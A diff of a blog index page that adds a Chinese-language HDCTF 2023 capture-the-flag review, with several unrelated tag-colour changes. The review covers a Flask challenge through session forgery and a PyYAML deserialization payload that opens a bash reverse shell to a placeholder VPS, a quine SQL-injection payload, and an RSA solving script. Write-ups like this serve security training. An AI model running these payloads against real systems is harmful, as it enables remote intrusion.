@@ -172,6 +172,188 @@
         
 
 <div class="post">
+    <a href="/2023/04/24/HDCTF%202023%20%E5%A4%8D%E7%9B%98/">
+        <h2 class="post-title">HDCTF 2023 复盘</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/24
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="yamiyami"><a href="#yamiyami" class="headerlink" title="yamiyami"></a>yamiyami</h2><p>当时考虑直接读的<code>/proc/self/environ</code><br>读到flag是not_flag<br>就没考虑过<code>/proc/1/environ</code>了<br>然后不知道py3URL二次编码的特性,读不到源码,无从下手<br>做flask算pin码的题做多了,还以为pid是1的就是self,难顶</p>
+<p>上面那种是非预期<br>预期是yaml反序列化</p>
+<p>先读源码<br><code>/read?url=file:///%25%36%31%25%37%30%25%37%30%25%32%66%25%36%31%25%37%30%25%37%30%25%32%65%25%37%30%25%37%39</code></p>
+<pre><code class="python">
+#encoding:utf-8
+import os
+import re, random, uuid
+from flask import *
+from werkzeug.utils import *
+import yaml
+from urllib.request import urlopen
+app = Flask(__name__)
+random.seed(uuid.getnode())
+app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)
+app.debug = False
+BLACK_LIST=[&quot;yaml&quot;,&quot;YAML&quot;,&quot;YML&quot;,&quot;yml&quot;,&quot;yamiyami&quot;]
+app.config[&#39;UPLOAD_FOLDER&#39;]=&quot;/app/uploads&quot;
+
+@app.route(&#39;/&#39;)
+def index():
+    session[&#39;passport&#39;] = &#39;YamiYami&#39;
+    return &#39;&#39;&#39;
+    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;
+    &lt;br&gt;
+    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;
+    &lt;br&gt;
+    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;
+    &#39;&#39;&#39;
+@app.route(&#39;/pwd&#39;)
+def pwd():
+    return str(pwdpath)
+@app.route(&#39;/read&#39;)
+def read():
+    try:
+        url = request.args.get(&#39;url&#39;)
+        m = re.findall(&#39;app.*&#39;, url, re.IGNORECASE)
+        n = re.findall(&#39;flag&#39;, url, re.IGNORECASE)
+        if m:
+            return &quot;re.findall(&#39;app.*&#39;, url, re.IGNORECASE)&quot;
+        if n:
+            return &quot;re.findall(&#39;flag&#39;, url, re.IGNORECASE)&quot;
+        res = urlopen(url)
+        return res.read()
+    except Exception as ex:
+        print(str(ex))
+    return &#39;no response&#39;
+
+def allowed_file(filename):
+   for blackstr in BLACK_LIST:
+       if blackstr in filename:
+           return False
+   return True
+@app.route(&#39;/upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def upload_file():
+    if request.method == &#39;POST&#39;:
+        if &#39;file&#39; not in request.files:
+            flash(&#39;No file part&#39;)
+            return redirect(request.url)
+        file = request.files[&#39;file&#39;]
+        if file.filename == &#39;&#39;:
+            return &quot;Empty file&quot;
+        if file and allowed_file(file.filename):
+            filename = secure_filename(file.filename)
+            if not os.path.exists(&#39;./uploads/&#39;):
+                os.makedirs(&#39;./uploads/&#39;)
+            file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename))
+            return &quot;upload successfully!&quot;
+    return render_template(&quot;index.html&quot;)
+@app.route(&#39;/boogipop&#39;)
+def load():
+    if session.get(&quot;passport&quot;)==&quot;Welcome To HDCTF2023&quot;:
+        LoadedFile=request.args.get(&quot;file&quot;)
+        if not os.path.exists(LoadedFile):
+            return &quot;file not exists&quot;
+        with open(LoadedFile) as f:
+            yaml.full_load(f)
+            f.close()
+        return &quot;van you see&quot;
+    else:
+        return &quot;No Auth bro&quot;
+if __name__==&#39;__main__&#39;:
+    pwdpath = os.popen(&quot;pwd&quot;).read()
+    app.run(
+        debug=False,
+        host=&quot;0.0.0.0&quot;
+    )
+    print(app.config[&#39;SECRET_KEY&#39;])
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/b2857d342e1b4f5997bd8746c8a30735.png" alt="在这里插入图片描述"><br>在&#x2F;boogipop路径下可触发反序列化<br>但是能进语句的条件是passport &#x3D;&#x3D; Welcome To HDCTF2023<br>那么我们需要伪造session<br><img src="https://img-blog.csdnimg.cn/71117d56ad844ab4bd9e4366600526e2.png" alt="在这里插入图片描述"></p>
+<p>这是生成secret key的逻辑<br>uuid.getnode返回网卡的int值<br>那么我们去读网卡<br>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address<br>得到<br><img src="https://img-blog.csdnimg.cn/87387918f92c416393908fe5bb4e1856.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/b6d45568858a46afbb5c92f79bafc15b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/79ebe40fc43e4571b64eb607182607f2.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f6a0ddc3caea46b19de85d0c06747c58.png" alt="在这里插入图片描述"><br>验证是否伪造成功<br><img src="https://img-blog.csdnimg.cn/ccd333e5d9924b0093964ac12a8220ac.png" alt="在这里插入图片描述"><br>成功伪造了session<br>然后我们构造恶意yaml文件<br>我这里命名为ac.ac</p>
+<pre><code class="yaml">!!python/object/new:str
+    args: []
+    state: !!python/tuple
+      - &quot;__import__(&#39;os&#39;).system(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps地址/9000 &lt;&amp;1\&quot;&#39;)&quot;
+      - !!python/object/new:staticmethod
+        args: []
+        state:
+          update: !!python/name:eval
+          items: !!python/name:list
+</code></pre>
+<p>触发<br><img src="https://img-blog.csdnimg.cn/8073dd513d6d4c84b1afdd8069861534.png" alt="在这里插入图片描述"><br>这里其实就拿到shell了,由于题目环境的问题是读不了flag的,还是得通过<code>/proc/1/environ</code>读</p>
+<h2 id="LoginMaster"><a href="#LoginMaster" class="headerlink" title="LoginMaster"></a>LoginMaster</h2><p>robots.txt泄露waf<br><img src="https://img-blog.csdnimg.cn/908345a883c740e59813066ded420bea.png" alt="在这里插入图片描述"><br>发现是quine查询<br>payload如下<br><code>1&#39;union/**/select/**/replace(replace(&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#</code></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="math-rsa"><a href="#math-rsa" class="headerlink" title="math_rsa"></a>math_rsa</h2><p>由题<br>p^2^ ≡ a mod r<br>即a是模p的二次剩余<br>通过sage求解p</p>
+<pre><code class="python">r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299
+a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625
+R.&lt;x&gt; = PolynomialRing(Zmod(r))
+f = x**2 - a
+print(f.roots())
+</code></pre>
+<pre><code class="python">from Crypto.Util.number import *
+import gmpy2
+n = 14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489
+r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299
+a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625
+c = 12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608
+e=65537
+p = 135098300162574110032318082604507116145598393187097375349178563291884099917465443655846455456198422625358836544141120445250413758672683505731015242196083913722084539762488109001442453793004455466844129788221721833309756439196036660458760461237225684006072689852654273913614912604470081753828559417535710077291
+q = n // p
+phi_n = (p-1)*(q-1)
+d = gmpy2.invert(e,phi_n)
+print(long_to_bytes(pow(c,d,n)).decode())
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/python/" style="color: #ffa2c4">python</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/flask/" style="color: #00a596">flask</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #ff7d73">后端</a>
+        </span>
+        
+    </div>
+    <a href="/2023/04/24/HDCTF%202023%20%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/04/24/sql%E6%B3%A8%E5%85%A5%20Quine%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">
         <h2 class="post-title">sql注入 Quine注入解析</h2>
     </a>
@@ -271,12 +453,12 @@ print(res)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
         <span class="tag">
@@ -331,12 +513,12 @@ print(res)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
+            <a href="/tags/linux/" style="color: #03a9f4">linux</a>
         </span>
         
         <span class="tag">
@@ -346,12 +528,12 @@ print(res)
         
         <span class="tag">
             
-            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #ff7d73">运维</a>
+            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #03a9f4">运维</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/ssh/" style="color: #00a596">ssh</a>
+            <a href="/tags/ssh/" style="color: #ff7d73">ssh</a>
         </span>
         
     </div>
@@ -560,7 +742,7 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
     </div>
@@ -613,22 +795,22 @@ print(flag)
         
         <span class="tag">
             
+            <a href="/tags/python/" style="color: #03a9f4">python</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
+        </span>
+        
+        <span class="tag">
+            
             <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/php/" style="color: #00a596">php</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/python/" style="color: #ff7d73">python</a>
+            <a href="/tags/php/" style="color: #00bcd4">php</a>
         </span>
         
     </div>
@@ -674,17 +856,17 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/php/" style="color: #00bcd4">php</a>
-        </span>
-        
-        <span class="tag">
-            
             <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/php/" style="color: #ff7d73">php</a>
         </span>
         
     </div>
@@ -772,22 +954,22 @@ sudo mount -t nfs 192.168.45.132:/home/peter /tmp/nfs
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/linux/" style="color: #ff7d73">linux</a>
+            <a href="/tags/linux/" style="color: #03a9f4">linux</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #00bcd4">服务器</a>
+            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #00a596">服务器</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="color: #ff7d73">学习</a>
+            <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="color: #ffa2c4">学习</a>
         </span>
         
     </div>
@@ -893,22 +1075,22 @@ print(rv)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/python/" style="color: #ff7d73">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #00a596">python</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/flask/" style="color: #ff7d73">flask</a>
+            <a href="/tags/flask/" style="color: #ffa2c4">flask</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #ffa2c4">后端</a>
+            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #ff7d73">后端</a>
         </span>
         
     </div>
@@ -1014,7 +1196,7 @@ print(sol)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
     </div>
@@ -1128,7 +1310,7 @@ print(two_squares(n))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
         </span>
         
         <span class="tag">
@@ -1138,7 +1320,7 @@ print(two_squares(n))
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #00a596">python</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
     </div>
